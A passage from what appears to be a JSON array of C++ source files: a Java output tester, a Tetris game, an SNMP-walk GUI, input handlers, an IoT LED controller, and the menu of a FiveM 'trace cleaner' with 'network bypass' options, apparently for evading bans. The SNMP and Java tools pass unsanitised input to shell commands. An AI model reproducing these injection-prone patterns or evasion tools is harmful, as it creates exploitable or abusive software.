Files(*.*)\\0*.*\\0\\0\");\r\n\tofn.lpstrFile=FileName;\r\n\tofn.nMaxFile=MAX_PATH;\r\n\tofn.Flags=OFN_FILEMUSTEXIST;\r\n\tstring strx;\r\n\tif(GetOpenFileName(&ofn)){\r\n\t    string str=FileName;  \r\n\t\tstring str0=\"javac \"+str;\r\n\t\tconst char* com=str0.data();\r\n\t\tsystem(com);\r\n\t\tint index=str.find_last_of(\"\\\\\"); \r\n\t\tstring str1=\"cd \"+str.substr(0,index);\r\n\t\tcom=str1.data();\r\n\t\tsystem(com);\r\n\t\tint index2=str.find_last_of(\".\"); \r\n\t\tstrx=\"java \"+str.substr(index+1,index2-index-1);\r\n\t\tstring strxx=str.substr(index+1,str.length()-index-1);\r\n\t    cout<<\"The currently selected program is \"<<strxx<<endl;\r\n\t}\r\n\treturn strx;\r\n}\r\n\r\nint main(){\r\n\t//\u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\r\n\t#ifdef ENV_VAR\r\n\t   Setting_envVar();\r\n\t#endif \r\n\t//\u83b7\u53d6jdk\u8def\u5f84\r\n\t//\u7f16\u8bd1java1\r\n\tprintf(\"Step1.Please select the program you want to compare 1(.java).\\n\"); \r\n\tstring strx=run_java(1);\r\n\t//\u7f16\u8bd1java2\r\n\tprintf(\"Step2.Please select the program you want to compare 2(.java).\\n\");  \r\n\tstring stry=run_java(2);\r\n\tprintf(\"Step3.Please select datator.\\n\");\r\n\tstring strz=run_rand_data();\r\n\tconst char*com1=strz.data();\r\n\tconst char*com2=strx.data();\r\n\tconst char*com3=stry.data();\r\n\tint cnt=0;\r\n\tprintf(\"begin testing......\\n\");\r\n\twhile(1){\r\n\t\t// \u5bfc\u5165\u6570\u636e \r\n\t\tsystem(com1);\r\n\t    system(com2);\r\n\t    system(com3);\r\n\t    cout<<\"current id:\"<<cnt<<endl;\r\n\t    if(++cnt>=1000){\r\n\t    \tcout<<\"test successful!\"<<endl;\r\n\t    \tbreak;\r\n\t\t}\r\n\t    if(system(\"fc ..\\\\answer1.out ..\\\\answer2.out\")){\r\n\t\t  cout<<\"find erro!\"<<endl;\r\n\t\t  break;\r\n\t    }\r\n\t}\r\n\tprintf(\"\\nTranslation completion----by shuilin.\\n\"); \t\t\r\n\tsystem(\"pause\");\r\n    return 0;\r\n}\r\n",
    "#include <SFML/Graphics.hpp>\n#include <vector>\nint main() {\n\tconst int fieldWidth = 10;    //\u9650\u5236\u4e00\u500b\u683c\u5b50\u9ad8\u5ea6\u53ca\u5bec\u5ea6\n\tconst int fieldHeight = 20;\n\n\tenum class Type {\n\t\tNone,\n\t\tO,\n\t\tI,\n\t};\n\n\tType field[fieldWidth][fieldHeight] = {};\t\t\t//\u63a7\u5236\u683c\u5b50\u662f\u5426\u7559\u5728\u539f\u5730\u7684\u958b\u95dc\n\n\tsf::Texture yellowTexture;   //\u958b\u555f\u9ec3\u8272\u65b9\u584a\u5716\u7247\n\tif (!yellowTexture.loadFromFile(\"yellow.png\")) {\n\t\treturn EXIT_FAILURE;\t//\u7576\u6c92\u6709\u958b\u555f\u7684\u6642\u5019\u7d50\u675f\u7a0b\u5f0f\t\n\t}\n\tsf::Texture lightBlueTextture;\n\tif (!lightBlueTextture.loadFromFile(\"light_blue.png\")) {\n\t\treturn EXIT_FAILURE;\n\t}\n\tstd::map<Type, std::vector<std::vector<sf::Vector2i>>> shapes = {   //\u4f7f\u7528vector\u4f86\u5132\u5b58(\u624d\u53ef\u4ee5\u8907\u88fd\u7d66currentShape)\n\t\t//shape_Os   \u7e6a\u88fd2*2\u7684\u9ec3\u8272\u65b9\u584a \u5229\u7528\u5ea7\u6a19\u7cfb\u7d71\u4f86\u5b8c\u6210 \t\n\t\t{\n\t\t\tType::O,\n\t\t\t{\n\t\t\t\t{\n\t\t\t\tsf::Vector2i(0, 0),\t\t\t\t\t\t\t\t\t//shape_Is  [0][0]\n\t\t\t\tsf::Vector2i(1, 0),\n\t\t\t\tsf::Vector2i(0,-1),\n\t\t\t\tsf::Vector2i(1,-1),\n\t\t\t\t}\n\t\t\t},\n\t\t},\n\t\t//shape_Is    //\u7e6a\u88fd1*4\u7684\u9ec3\u8272\u65b9\u584a \u5229\u7528\u5ea7\u6a19\u7cfb\u7d71\u4f86\u5b8c\u6210\n\t\t{\n\t\t\tType::I,\n\t\t\t{\n\t\t\t\t{\n\t\t\t\tsf::Vector2i(-1,0),\t\t\t\t\t\t\t\t//shape_Is  [1][0]\n\t\t\t\tsf::Vector2i(0,0),\n\t\t\t\tsf::Vector2i(1,0),\n\t\t\t\tsf::Vector2i(2,0),\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\tsf::Vector2i(0,-2),\t\t\t\t\t\t\t\t//shape_Is  [1][0]\n\t\t\t\tsf::Vector2i(0,-1),\n\t\t\t\tsf::Vector2i(0, 0),\n\t\t\t\tsf::Vector2i(0, 1),\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t};\n\n\tType currentType = Type(rand() % 2 + 1);   //(\u4f7f\u7528\u6574\u6578\u4f86\u8868\u793aENUM\u7684\u7528\u6cd5)RAND%2 \u70ba0 \u8a2d\u5b9a\u70ba O\u5f62 \uff0c\u70ba1\u8a2d\u5b9a\u70ba I\u5f62\n\tint currentIndex = 0;\t\t\t\t\t\t//\u4f7f\u65b9\u584a\u505a\u65cb\u8f49 \u6240\u6709\u7684\u65b9\u584a\u90fd\u6709  0 \u865f\u9019\u500b\u65b9\u5411\n\n\tconst int blockWidth = yellowTexture.getSize().x;   //\u9ec3\u8272\u683c\u5b50\u7684\u5bec\u5ea6\u53ca\u9ad8\u5ea6\n\tconst int blockHeight = yellowTexture.getSize().y;\n\n\tconst int windowWidth = fieldWidth * blockWidth;    //\u8996\u7a97\u7684\u5bec\u5ea6\u53ca\u9ad8\u5ea6\n\tconst int windowHeight = fieldHeight * blockHeight;\n\n\tstd::map<Type, sf::Sprite> sprites = {\t\t\t\t\t//\u4f7f\u7528vector\u4f86\u5132\u5b58(\u624d\u53ef\u4ee5\u8907\u88fd\u7d66currentSprite)\n\t\t{Type::O, sf::Sprite(yellowTexture)},\n\t\t{Type::I, sf::Sprite(lightBlueTextture)},\n\t};\n\n\tstd::vector<sf::Vector2i> currentShape;   //\u9078\u5b9a\u73fe\u5728\u843d\u4e0b\u7684\u65b9\u584a(\u4f7f\u7528rand\u505a\u96a8\u6a5f\u62bd\u9078\u4e00\u500b\u5f62\u72c0)\n\tsf::Sprite currentSprite;\n\n\tconst sf::Vector2i origin(fieldWidth / 2, 0);\t\t//\u4e00\u958b\u59cb\u6703\u5728\u5834\u5730\u7684\u4e2d\u9593  (\u5834\u5730\u7684\u5bec / 2, \u9ad8\u5ea6\u70ba 0)\t\n\tsf::Vector2i pos(origin);\t\t\t\t\t\t\t//\u64f7\u53d6\u683c\u5b50\u76ee\u524d\u4f4d\u7f6e\n\n\tsf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), L\"\u4fc4\u7f85\u65af\u65b9\u584a\");\n\tsf::Clock clock;\n\twhile (window.isOpen()) {\n\t\tcurrentShape  = shapes[currentType][currentIndex];\t\t\t\t//\u9078\u5b9a\u65b9\u584a\u5f62\u72c0  O...I...  \n\t\tcurrentSprite = sprites[currentType];\t\t\t\t//\u7e6a\u88fd\u65b9\u584a\u984f\u8272\n\n\t\tenum class Action {      //\u6848\u4ef6\u7684\u4e92\u52d5\n\t\t\tHold,\n\t\t\tMoveDown,\n\t\t\tMoveLeft,\n\t\t\tMoveRight,\n\t\t\tRotate,\n\t\t};\n\t\tAction action = Action::Hold;   //\u4e00\u958b\u59cbdefault\u70baHold\n\n\t\tsf::Event evt;\t\t\t\t//\u958b\u555f\u8996\u7a97\n\t\tif (window.pollEvent(evt)) {\n\t\t\tif (evt.type == sf::Event::Closed) {             //\u8a2d\u5b9a\u8996\u7a97\u7684\u958b\u95dc\n\t\t\t\twindow.close();\n\t\t\t}\n\t\t\tif (evt.type == sf::Event::KeyPressed) {\n\t\t\t\tswitch (evt.key.code) {\n\t\t\t\tcase sf::Keyboard::Left:\n\t\t\t\t\taction = Action::MoveLeft;\n\t\t\t\t\tbreak;\n\t\t\t\tcase sf::Keyboard::Right:\n\t\t\t\t\taction = Action::MoveRight;\n\t\t\t\t\tbreak;\n\t\t\t\tcase sf::Keyboard::Up:\n\t\t\t\t\taction = Action::Rotate;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (clock.getElapsedTime().asSeconds() >= 0.3f) {    //\u7528Clock\u4f86\u8a2d\u5b9a\u6bcf0.3\u79d2\u4e0b\u964d\u4e00\u683c  \u6700\u5f8c\u8981restart\u6642\u9593\n\t\t\taction = Action::MoveDown;\t\t\t\t\t\t//default\u4e00\u958b\u59cb\u5c31\u4e00\u76f4\u5f80\u4e0b\t\n\t\t\tclock.restart();\n\t\t}\n\n\t\tsf::Vector2i nextPos(pos);\n\t\tint nextIndex = currentIndex;\n\t\tif (action == Action::Rotate) {\n\t\t\tnextIndex = (nextIndex + 1) % shapes[currentType].size();  //\u4f7f\u7528%\u6c42\u65bc\u6578\u4f86\u6709\u5e7e\u7a2e\u65cb\u8f49\u7684\u65b9\u5411\u7684\u4e0a\u9650\n\t\t}\n\t\tstd::vector<sf::Vector2i> nextShape = shapes[currentType][nextIndex];\n\n\t\tswitch (action) {\t\t\t\t\t\t\t\t\t//\u7528switch\u4f86\u8a2d\u5b9a\u4e0a\u4e0b\u5de6\u53f3\n\t\tcase Action::Hold:\n\t\t\tbreak;\n\t\tcase Action::MoveDown:\n\t\t\tnextPos.y++;\n\t\t\tbreak;\n\t\tcase Action::MoveLeft:\n\t\t\tnextPos.x--;\n\t\t\tbreak;\n\t\tcase Action::MoveRight:\n\t\t\tnextPos.x++;\n\t\t\tbreak;\n\t\t}\n\t\tint countEmpty = 0;\n\t\tfor (const sf::Vector2i d : nextShape) {\n\t\t\tsf::Vector2i np = nextPos + d;\t\t\t\t\t// 4\u500b\u683c\u5b50\u7684\u4f4d\u79fb\n\t\t\tif (np.x >= 0 && np.x < fieldWidth &&\t\t\t//\u8a2d\u5b9a4\u500b\u683c\u5b50\u7684\u4e0b\u4e00\u500b\u4f4d\u7f6e\u4e0d\u80fd\u8d85\u51fa\u539f\u59cb\u8996\u7a97\u7684\u5bec\u9ad8\n\t\t\t\tnp.y < fieldHeight &&\t\t\t\t\t\t//\u5de6\u53f3\u5169\u908a\u4e0d\u53ef\u8d85\u904e \u5e95\u90e8\u78b0\u5230\u4fdd\u7559 \n\t\t\t\t(np.y < 0 || field[np.x][np.y] == Type::None)) { //\u9664\u4e86\u6aa2\u67e5\u4e0d\u80fd\u8d85\u8d8a\u539f\u59cb\u8996\u7a97\u7684\u5bec\u9ad8 \u4e5f\u8981\u770b\u8a72\u4f4d\u7f6e\u662f\u5426\u5df2\u7d93\u6709\u683c\u5b50\t\t\t\t\t\t\t\t\t\t\t\t\t \n\t\t\t\tcountEmpty++;\n\t\t\t}\n\t\t}\n\n\t\tif (countEmpty == 4) {\n\t\t\tpos = nextPos;\t\t\t\t\t//\u66f4\u65b0\u8b8a\u52d5\u904e\u5f8c\u7684\u53c3\u6578\n\t\t\tcurrentIndex = nextIndex;\n\t\t\tcurrentShape = nextShape;\n\t\t}\n\t\telse {\n\t\t\tif (action == Action::MoveDown) {\n\t\t\t\tfor (const sf::Vector2i& d : currentShape) {\n\t\t\t\t\tsf::Vector2i np = pos + d;\n\t\t\t\t\tif (np.y >= 0) {\n\t\t\t\t\t\tfield[np.x][np.y] = currentType;\n\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t//\u7576\u78b0\u5230\u4e0d\u80fd\u5728\u5f80\u4e0b\u6642\u5019 \u8a18\u5f97\u9019\u500b\u683c\u5b50 \n\t\t\t\t}\n\t\t\t\tfor (int y = 0; y < fieldHeight; y++) {\n\t\t\t\t\tbool isFull = true;\n\t\t\t\t\tfor (int x = 0; x < fieldWidth; x++) {\n\t\t\t\t\t\tif (field[x][y] == Type::None) {\n\t\t\t\t\t\t\tisFull = false;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (isFull) {\n\t\t\t\t\t\tfor (int ty = y; ty > 0; ty--) {\n\t\t\t\t\t\t\tfor (int x = 0; x < fieldWidth; x++) {\n\t\t\t\t\t\t\t\tfield[x][ty] = field[x][ty - 1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tfor (int x = 0; x < fieldWidth; x++) {\n\t\t\t\t\t\t\tfield[x][0] = Type::None;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tpos = origin;\t\t\t\t\t\t\t\t//\u7576\u78b0\u5230\u5e95\u90e8\u6642 \u96a8\u6a5f\u62bd\u9078\u4e00\u500b\u5f62\u72c0\n\t\t\t\tcurrentType = Type(rand() % 2 + 1);\n\t\t\t\tcurrentIndex = 0;\t\t\t\t\t\t\t//\u91cd\u65b0\u958b\u59cb\u7684\u6642\u5019\u8981\u628a\u65b9\u5411\u8ddfType\u90fd\u91cd\u65b0\u8a2d\u5b9a\n\t\t\t}\n\t\t}\n\t\twindow.clear();\n\t\t//\u7e6a\u88fd\u80cc\u666f\u5834\u5730\n\t\tfor (int x = 0; x < fieldWidth; x++) {\n\t\t\tfor (int y = 0; y < fieldHeight; y++) {\n\t\t\t\tif (field[x][y] == Type::None) continue; \t\t\t//\u4fdd\u7559\u843d\u4e0b\u7684\u683c\u5b50\n\n\t\t\t\tsf::Sprite& s = sprites[field[x][y]];\n\n\t\t\t\ts.setPosition(\n\t\t\t\t\tfloat(x * blockWidth),\n\t\t\t\t\tf",
    "#include<bits/stdc++.h>\r\n#define ios ios_base::sync_with_stdio(false);cin.tie(0);cout.tie(0);\r\nusing ll = long long;\r\nusing namespace std;\r\n// The idea is to fix one point and find two other points such that the difference between the first and the last does not exceed d.\r\n// To achieve this, we can search for points[i] + d, knowing the interval between the index i and the index of the element that is <= points[i] + d.\r\n// We use the combination formula to calculate the number of ways to choose two points from the available n points.\r\n// The combination formula is:\r\n// C(n, k) = n! / ((n - k)! * k!), but since k = 2, we can simplify it to...\r\n// C(n, 2) = (n * (n - 1) * (n - 2)!) / ((n - 2)! * 2!)\r\n// C(n, 2) = (n * (n - 1)) / 2\r\nint binarySearch(vector<int>& x,int value,int start){\r\n    int l = start;\r\n    int r = x.size()-1;\r\n    int middle = (l + r)/2;\r\n\r\n    if(value > x.back())\r\n        return x.size()-1;\r\n    while(l<=r)\r\n    {\r\n        if(middle == value)\r\n            return middle;\r\n        if(value<x[middle])\r\n            r = middle - 1;\r\n        else\r\n            l = middle + 1; \r\n        middle = (l + r) /2;\r\n    }\r\n    return middle;\r\n}\r\n\r\nint main(){\r\n    int n,d;\r\n    cin >> n >> d;\r\n    vector <int> points(n);\r\n    for(int i=0;i<n;i++){\r\n        cin>>points[i];\r\n    }\r\n    ll count = 0;\r\n    for(int i=0;i<n-2;i++){\r\n        \r\n        ll bSearch = binarySearch(points,points[i] + d, i + 1);\r\n        count += (bSearch - i) * (bSearch - i - 1) / 2;\r\n    }\r\n    cout << count <<endl;\r\n}\r\n\r\n",
    "#include \"mouse.h\"\n\ndouble Mouse::x = 0, Mouse::y = 0;\n\ndouble Mouse::lastX = 0, Mouse::lastY = 0;\n\ndouble Mouse::dx = 0, Mouse::dy = 0;\n\ndouble Mouse::scrollDx = 0, Mouse::scrollDy = 0;\n\nbool Mouse::firstMouse = true;\n\nbool Mouse::buttons[GLFW_MOUSE_BUTTON_LAST] = { 0 };\nbool Mouse::buttonsChanged[GLFW_MOUSE_BUTTON_LAST] = { 0 };\n\nbool Mouse::EnforceCursor = false;\nbool Mouse::sw = false;\n\nvoid Mouse::cursorPosCallback(GLFWwindow* window, double _x, double _y){\n\tx = _x;\n\ty = _y;\n\n\tif (firstMouse) {\n\t\tlastX = x;\n\t\tlastY = y;\n\t\tfirstMouse = false;\n\t}\n\n\tdx = x - lastX;\n\tdy = lastY - y;\n\n\tlastX = x;\n\tlastY = y;\n\n\tif (EnforceCursor && sw) {\n\t\tglfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\t\tsw = false;\n\t}\n\n\tif (!EnforceCursor && sw) {\n\t\tglfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_NORMAL);\n\t\tsw = false;\n\t}\n}\n\nvoid Mouse::mouseButtonCallback(GLFWwindow* window, int button, int action, int mods){\n\t// buttons[button] = action != GLFW_RELEASE;\n\t// buttonsChanged[button] = action != GLFW_REPEAT;\n\t// GLFW_REPEAT does not work for the mouse buttons\n\n\tif (action == GLFW_RELEASE) {\n\t\tif (buttons[button]) buttonsChanged[button] = true;\n\t\tbuttons[button] = false;\n\t}\n\n\tif (action == GLFW_PRESS) {\n\t\tif (!buttons[button]) buttonsChanged[button] = true;\n\t\tbuttons[button] = true;\n\t}\n}\n\nvoid Mouse::mouseWheelCallback(GLFWwindow* window, double dx, double dy){\n\tscrollDx = dx;\n\tscrollDy = dy;\n}\n\ndouble Mouse::getMouseX() { return x;  }\n\ndouble Mouse::getMouseY() { return y; }\n\ndouble Mouse::getMouseDX() { \n\tdouble _dx = dx;\n\tdx = 0;\n\treturn _dx;\n}\n\ndouble Mouse::getMouseDY() { \n\tdouble _dy = dy;\n\tdy = 0;\n\treturn _dy;\n}\n\ndouble Mouse::getMouseScrollDX(){\n\tdouble _sdx = scrollDx;\n\tscrollDx = 0;\n\treturn _sdx;\n}\n\ndouble Mouse::getMouseScrollDY(){\n\tdouble _sdy = scrollDy;\n\tscrollDy = 0;\n\treturn _sdy;\n}\n\nbool Mouse::button(int button){\n\treturn buttons[button];\n}\n\nbool Mouse::buttonChanged(int button){\n\tbool ret = buttonsChanged[button];\n\tbuttonsChanged[button] = false;\n\treturn ret;\n}\n\nbool Mouse::buttonWentUp(int button){\n\treturn !buttons[button] && buttonChanged(button);\n}\n\nbool Mouse::buttonWentDown(int button)\n{\n\treturn buttons[button] && buttonChanged(button);\n}\n\nvoid Mouse::centerCursor(bool val) {\n\tEnforceCursor = val;\n\tsw = true;\n}\n",
    "#include \"LEDHandler.h\"\n\nextern const int pinLED;\nextern const int pinInput;\nextern const char *logLightStatusUrl;\n\nvoid logLightStatus(const char *status)\n{\n    if (WiFi.status() == WL_CONNECTED)\n    {\n        WiFiClient client;\n        HTTPClient http;\n        http.begin(client, logLightStatusUrl);\n        http.addHeader(\"Content-Type\", \"application/json\");\n\n        StaticJsonDocument<200> doc;\n        doc[\"status\"] = status;\n        doc[\"timestamp\"] = String(millis());\n\n        String payload;\n        serializeJson(doc, payload);\n\n        int httpCode = http.POST(payload);\n        if (httpCode > 0)\n        {\n            String response = http.getString();\n            Serial.println(httpCode);\n            Serial.println(response);\n        }\n        else\n        {\n            Serial.print(\"Error on HTTP request: \");\n            Serial.println(http.errorToString(httpCode).c_str());\n        }\n        http.end();\n    }\n    else\n    {\n        Serial.println(\"WiFi Disconnected\");\n    }\n}\n\nvoid handleLED(int time_until_watering, int maxOnDuration, const char *noButtonSignalUrl, const char *ssid, const char *password, int waitState)\n{\n    // Turn on the LED\n    digitalWrite(pinLED, HIGH);\n    logLightStatus(\"on\");\n    disconnectFromWiFi();\n    unsigned long startTime = millis();\n    bool ButtonSignal = false;\n\n    while (millis() - startTime < maxOnDuration)\n    {\n        // Read the button state directly without debouncing\n        int buttonState = digitalRead(pinInput);\n\n        // Check if the button state matches the wait state\n        if (buttonState == waitState)\n        {\n            ButtonSignal = true;\n            break;\n        }\n\n        delay(10); // Small delay to prevent high CPU usage\n    }\n\n    // Turn off the LED\n    digitalWrite(pinLED, LOW);\n    connectToWiFi(ssid, password);\n    logLightStatus(\"off\");\n\n    // If no button signal received, perform shutdown\n    if (!ButtonSignal)\n    {\n        sendRequestToServer(noButtonSignalUrl);\n        shutdown(\"No button signal received, shutting down\");\n    }\n}\n\nvoid processResponse(const String &payload)\n{\n    StaticJsonDocument<200> doc;\n    DeserializationError error = deserializeJson(doc, payload);\n    if (error)\n    {\n        Serial.print(\"deserializeJson() failed: \");\n        Serial.println(error.f_str());\n        return;\n    }\n\n    int time_until_watering = 1000 * int(doc[\"time_until_watering\"]);\n    unsigned long watering_time = doc[\"watering_time\"]; // Access the value as an integer\n    String current_time = doc[\"current_time\"];\n\n    Serial.print(\"time_until_watering after JSON parsing = \");\n    Serial.println(time_until_watering);\n    Serial.print(\"LED On Duration = \");\n    Serial.println(watering_time);\n    Serial.print(\"Current Time = \");\n    Serial.println(current_time);\n\n    if (time_until_watering < waitThreshold + 15000)\n    {\n        if (time_until_watering > 0)\n        {\n            disconnectFromWiFi();\n            Serial.printf(\"Sleeping for %d ms before doing a cycle\\n\", time_until_watering);\n            delay(time_until_watering);\n            connectToWiFi(ssid, password);\n        }\n\n        handleLED(time_until_watering, maxOnDuration, noButtonSignalUrl, ssid, password, LOW);\n        delay(watering_time);\n        handleLED(time_until_watering, maxOnDuration, noButtonSignalUrl, ssid, password, HIGH);\n    }\n    else\n    {\n        disconnectFromWiFi();\n        Serial.printf(\"Sleeping for %d ms\\n\", waitThreshold);\n        delay(waitThreshold); // Sleep for the threshold time\n        connectToWiFi(ssid, password);\n    }\n}\n\nvoid resetLED()\n{\n    digitalWrite(pinLED, HIGH);\n    delay(5000);\n    digitalWrite(pinLED, LOW);\n    if (digitalRead(pinInput) == HIGH)\n    {\n        handleLED(0, maxOnDuration, noButtonSignalUrl, ssid, password, HIGH);\n    }\n\n    if (digitalRead(pinInput) == LOW)\n    {\n        handleLED(0, maxOnDuration, noButtonSignalUrl, ssid, password, HIGH);\n        if (digitalRead(pinInput) == HIGH)\n        {\n            handleLED(0, maxOnDuration, noButtonSignalUrl, ssid, password, LOW);\n        }\n    }\n}",
    "#include \"Player.h\"\n\n\n//Initializaer functions\nvoid Player::initVariables()\n{\n\n}\n\nvoid Player::initComponents()\n{\n\n\n}\n\nPlayer::Player(float x, float y, sf::Texture& texture)\n{\n\tthis->initVariables();\n\n\tthis->setPosition(x, y);\n\n\tthis->createhitboxComponent(this->sprite, 0.f, 0.f, 32.f, 32.f);\n\tthis->createMovementComponent(100.f, 5.f, 3.f);\n\tthis->movementComponent->setVelocityOnStart();\n\tthis->createAnimationComponent(texture);\n\tthis->animationComponent->addAnimation(\"RIGHT\", 20.f, 3, 3, 6, 3, 32, 32);\n\tthis->animationComponent->addAnimation(\"IDLE\", 20.f, 3, 3, 3, 3, 32, 32);\n\tthis->animationComponent->addAnimation(\"LEFT\", 20.f, 3, 3, 0, 3, 32, 32);\n\tthis->animationComponent->addAnimation(\"UP\", 20.f, 3, 3, 3, 0, 32, 32);\n\tthis->animationComponent->addAnimation(\"DOWN\", 20.f, 3, 3, 3, 6, 32, 32);\n\n}\n\nPlayer::~Player()\n{\n}\n\n//Functions\nvoid Player::update(const float& dt)\n{\n\tthis->movementComponent->update(dt);\n\n\tif (this->movementComponent->getMovingState(IDLE))\n\t\tthis->animationComponent->play(\"IDLE\", dt);\n\telse if (this->movementComponent->getMovingState(MOVING_RIGHT))\n\t\tthis->animationComponent->play(\"RIGHT\", dt);\n\telse if (this->movementComponent->getMovingState(MOVING_LEFT))\n\t\tthis->animationComponent->play(\"LEFT\", dt);\n\telse if (this->movementComponent->getMovingState(MOVING_DOWN))\n\t\tthis->animationComponent->play(\"DOWN\", dt);\n\telse if (this->movementComponent->getMovingState(MOVING_UP))\n\t\tthis->animationComponent->play(\"UP\", dt);\n\t\n\tthis->hitboxComponent->update();\n}\n\n",
    "#include \"mainwindow.h\"\n#include <QProcess>\n#include <QStringList>\n#include <QDebug>\n///\n/// \\brief MainWindow::MainWindow\n/// \\param parent\n///\n///\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent) {\n    // Create widgets\n    versionLineEdit = new QLineEdit(this);\n    communityLineEdit = new QLineEdit(this);\n    hostnameLineEdit = new QLineEdit(this);\n    oidLineEdit = new QLineEdit(this);\n    executeButton = new QPushButton(\"Execute SNMP WALK\", this);\n    outputTextEdit = new QTextEdit(this);\n\n    // Set placeholder text for the line edits\n    versionLineEdit->setPlaceholderText(\"Enter SNMP version (e.g., 2c)\");\n    communityLineEdit->setPlaceholderText(\"Enter community string\");\n    hostnameLineEdit->setPlaceholderText(\"Enter hostname or IP address\");\n    oidLineEdit->setPlaceholderText(\"Enter OID (e.g., 1.3.6.1.2.1.1)\");\n\n    // Set up layout\n    QVBoxLayout *layout = new QVBoxLayout();\n    layout->addWidget(versionLineEdit);\n    layout->addWidget(communityLineEdit);\n    layout->addWidget(hostnameLineEdit);\n    layout->addWidget(oidLineEdit);\n    layout->addWidget(executeButton);\n    layout->addWidget(outputTextEdit);\n\n    // Create a central widget and set layout\n    QWidget *centralWidget = new QWidget(this);\n    centralWidget->setLayout(layout);\n    setCentralWidget(centralWidget);\n\n    // Connect button click signal to the slot\n    connect(executeButton, &QPushButton::clicked, this, &MainWindow::onExecuteButtonClicked);\n}\n\nMainWindow::~MainWindow() {\n}\n\nvoid MainWindow::onExecuteButtonClicked() {\n    QString version = versionLineEdit->text();\n    QString community = communityLineEdit->text();\n    QString hostname = hostnameLineEdit->text();\n    QString oid = oidLineEdit->text();\n\n    executeSnmpWalk(version, community, hostname, oid);\n}\n///\n/// \\brief MainWindow::executeSnmpWalk\n/// \\param version\n/// \\param community\n/// \\param hostname\n/// \\param oid\n///\nvoid MainWindow::executeSnmpWalk(const QString &version, const QString &community, const QString &hostname, const QString &oid) {\n    // Clear previous output\n    outputTextEdit->clear();\n\n    // Construct the command\n    QString command = \"snmpwalk -v \" + version + \" -c \" + community + \" \" + hostname + \" \" + oid;\n\n    // Execute the command\n    QProcess process;\n    process.start(command);\n    process.waitForFinished();\n\n    // Capture the output\n    QString output = process.readAllStandardOutput();\n    QString error = process.readAllStandardError();\n\n    // Print the output and error\n    outputTextEdit->setPlainText(\"Output:\\n\" + output + \"\\nError:\\n\" + error);\n}\n",
    "\ufeff#include \"core/trace.hpp\"\r\n#include \"core/network.hpp\"\r\n\r\nint main()\r\n{\r\n\tint choice;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\r\n\t\tstd::cout << R\"(\r\n                                            \r\n                                                            \r\n                 *//                                          \r\n             .*/****/.       ,***************                 \r\n        *****************************************             \r\n      ******(***************************************          \r\n   .********%#***************************************         \r\n   **************************************************.        \r\n        ////**********************//******************        \r\n                ////*************////*****************        \r\n                   ////*******///////****************         \r\n                       //*****///////*********************    \r\n                          ***.          *********     ******* \r\n                        *****        ********             ****\r\n                                                          ****\r\n                                                      ,*****  \r\n                             .*************************       \r\n\r\n\t)\" << '\\n';\r\n\r\n\t\tg_network = std::make_unique<network>();\r\n\t\tg_trace = std::make_unique<trace>();\r\n\r\n\t\twhile (true)\r\n\t\t{\r\n\t\t\tg_trace->m_fivem_path = g_trace->set_folder(\"Select FiveM Folder which contains FiveM.exe\");\r\n\r\n\t\t\tsystem(\"cls\");\r\n\r\n\t\t\tif (!g_trace->m_fivem_path.empty())\r\n\t\t\t{\r\n\t\t\t\tstd::cout << \"  [Selected Folder]  \" << g_trace->m_fivem_path << std::endl;\r\n\t\t\t\tstd::cout << \"  [Launch Build]  \" << g_trace->get_launch_build() << \"\\n\" << std::endl;\r\n\t\r\n\t\t\t\tstd::cout << \"  [1]  :  \" << \"clean traces\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [2]  :  \" << \"enable network bypass\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [3]  :  \" << \"disable network bypass\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [4]  :  \" << \"reset fivem path\" << std::endl;\r\n\t\t\t\tstd::cout << \"  [5]  :  \" << \"edit launch options\" << std::endl;\r\n\t\t\t\tstd::cin >> choice;\r\n\r\n\t\t\t\tswitch (choice)\r\n\t\t\t\t{\r\n\t\t\t\t\tcase 1:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->setup();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 2:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_network->setup();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 3:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_network->destroy();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 4:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->destroy();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 5:\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tg_trace->set_launch_build();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tstd::cout << \"  [Error]  :  \" << \"select valid folder for FiveM\" << \"\\n\" << std::endl;\r\n\t\t\t}\r\n\r\n\t\t\tsystem(\"Pause\");\r\n\t\t}\r\n\r\n\t\tsystem(\"Pause\");\r\n\t}\r\n\r\n}\r\n",
